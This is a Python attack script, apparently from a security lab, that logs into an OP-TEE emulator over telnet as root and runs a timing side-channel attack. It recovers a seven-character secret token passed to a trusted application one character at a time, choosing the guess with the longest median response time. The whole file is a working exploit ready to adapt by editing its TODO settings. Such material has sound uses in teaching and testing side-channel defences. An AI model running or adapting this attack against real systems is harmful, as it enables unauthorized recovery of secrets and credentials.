import sys
import time
import string
import statistics
import pexpect

# TODO: Set the Telnet connection parameters
TELNET_HOST = "127.0.0.1"
TELNET_PORT = 5555

# TODO: Set the number of requests to make for each guess
N = 4

# TODO: Set the size of the token to guess
TOKEN_SIZE = 7

# TODO: Set your TA command (adjust based on your app)
TA_COMMAND = "ta_secret -e sample.txt key"  # e.g., "my_ta {token}" or however your app expects input

# Global child process - maintain single session
child = None

# Custom exception for when the password is found
class PasswordFound(Exception):
    def __init__(self, password):
        self.password = password

""" def connect_and_login():

    
    

    child = pexpect.spawn(f"telnet {TELNET_HOST} {TELNET_PORT}", timeout=30)
    
     # Enable logging to stdout
    child.logfile_read = sys.stdout.buffer
   
    # Send empty line to trigger login prompt
    child.sendline("")
    child.sendline("")
    
    # Wait for login prompt and log in as root
    child.expect("login:")
    child.sendline("root")

    print("logged in")
    
    # Wait for shell prompt
    child.expect("#")
    
    return child """

def try_to_hack(characters):
    """
    Makes N requests with the given token guess and measures the response time.
    If the token is correct, raises PasswordFound exception.
    Returns a list of timing measurements.
    """
    global child
    timings = []
    
    for _ in range(N):
        try:
            print("loop try to hack")
            
            # Check if child is still alive
            if not child.isalive():
                print("[!] Session died, exiting...")
                timings.append(float('inf'))
                continue
            
            # Start timing
            start = time.time()
            print(f"{TA_COMMAND} {characters}")
            
            # Run your TA with the token guess
            child.sendline(f"{TA_COMMAND} {characters}")
            
            # Wait for command to complete (shell prompt returns)
            child.expect("#")
            
            # End timing
            end = time.time()
            
            timings.append(end - start)
            
            # Get the output to check for success
            output = child.before.decode("utf-8", errors="ignore")
            
            print(f"Output snippet: {output[-100:]}")
            
            # Check if successful (adjust based on your app's output)
            if ("success" in output.lower() or "correct" in output.lower()) and "wrong" not in output.lower():
                raise PasswordFound(characters)
            
        except pexpect.TIMEOUT:
            print(f"[!] Timeout during connection")
            timings.append(float('inf'))
            # Try to recover
            try:
                child.sendcontrol('c')
                child.expect("#", timeout=2)
            except:
                pass
        except pexpect.EOF:
            print(f"[!] Connection closed unexpectedly")
            timings.append(float('inf'))
            break
        except PasswordFound:
            raise
        except Exception as e:
            print(f"[!] Error: {e}")
            timings.append(float('inf'))
    
    return timings

def find_next_character(base):
    """
    Try all possible characters at the next position and return the one
    that takes the longest time (likely the correct one).
    """
    measures = []
    
    print(f"\n[*] Testing position {len(base) + 1}/{TOKEN_SIZE}")
    
    for c in string.ascii_lowercase:
        guess = base + c + 'a' * (TOKEN_SIZE - len(base) - 1)
        print(f"\n[*] Trying: {guess}", end=' ', flush=True)
        
        times = try_to_hack(guess)
        
        # Filter out infinite times (failed connections)
        valid_times = [t for t in times if t != float('inf')]
        
        if valid_times:
            median_time = statistics.median(valid_times)
            min_time = min(valid_times)
            max_time = max(valid_times)
            stddev = statistics.stdev(valid_times) if len(valid_times) > 1 else 0
            
            measures.append({
                'char': c,
                'median': median_time,
                'min': min_time,
                'max': max_time,
                'stddev': stddev
            })
            
            print(f"(median: {median_time:.4f}s)")
        else:
            print(f"(all failed)")
    
    print()  # New line after tests
    
    if not measures:
        print("\n[!] ERROR: All attempts failed.")
        sys.exit(1)
    
    # Sort by median time (descending - longer time suggests correct character)
    measures.sort(key=lambda x: x['median'], reverse=True)
    
    # Display top candidates
    print(f"[*] Top 5 candidates:")
    for i, m in enumerate(measures[:min(5, len(measures))]):
        print(f"    {i+1}. '{m['char']}': median={m['median']:.6f}s, "
              f"min={m['min']:.6f}s, max={m['max']:.6f}s, stddev={m['stddev']:.6f}s")
    
    best_char = measures[0]['char']
    second_best = measures[1]['median'] if len(measures) > 1 else 0
    diff = measures[0]['median'] - second_best
    
    print(f"[+] Selected: '{best_char}' (advantage: {diff:.6f}s)")
    
    return best_char

def main():
    global child
    
    print("[*] Starting timing attack on OP-TEE application...")
    print(f"[*] Target: {TELNET_HOST}:{TELNET_PORT}")
    print(f"[*] Token size: {TOKEN_SIZE}")
    print(f"[*] Samples per guess: {N}")
    print(f"[*] Command: {TA_COMMAND}")
    
    # Test initial connection
    print("\n[*] Testing initial connection...")
    try:
        child = pexpect.spawn(f"telnet {TELNET_HOST} {TELNET_PORT}", timeout=30)
        
        # Enable logging to stdout
        child.logfile_read = sys.stdout.buffer
    
        # Send empty line to trigger login prompt
        child.sendline("")
        
        # Wait for login prompt and log in as root
        child.expect("login:")
        child.sendline("root")

        print("logged in\n")
        
        # Wait for shell prompt
        child.expect("#")

        child.sendline("echo 'Connection successful'")
        child.expect("#")
        
        print("[+] Initial connection successful!")
    except Exception as e:
        print(f"[!] Initial connection failed: {e}")
        return
    
    base = ""
    print("will start to try to hack\n")
    
    try:
        while len(base) < TOKEN_SIZE:
            next_char = find_next_character(base)
            base += next_char
            print(f"\n[***] Current guess: {base}\n")
            
    except PasswordFound as pf:
        print(f"\n[!!!] Password found: {pf.password}")
        # Clean exit
        try:
            child.sendline("exit")
            child.expect(pexpect.EOF, timeout=2)
            child.close()
        except:
            pass
        return
    except KeyboardInterrupt:
        print(f"\n[!] Interrupted by user")
        try:
            child.sendline("exit")
            child.close()
        except:
            pass
        return
    
    print(f"\n[!] Attack complete. Guessed token: {base}")
    
    # Verify the guessed password
    print(f"\n[*] Verifying guessed password: {base}")
    try:
        times = try_to_hack(base)
        valid = [t for t in times if t != float('inf')]
        if valid:
            avg_time = statistics.mean(valid)
            print(f"[*] Average time: {avg_time:.4f}s ({len(valid)}/{N} successful)")
    except PasswordFound:
        print(f"[!!!] Password verified: {base}")
    
    # Clean exit
    try:
        child.sendline("exit")
        child.expect(pexpect.EOF, timeout=2)
        child.close()
    except:
        pass

if __name__ == '__main__':
    main()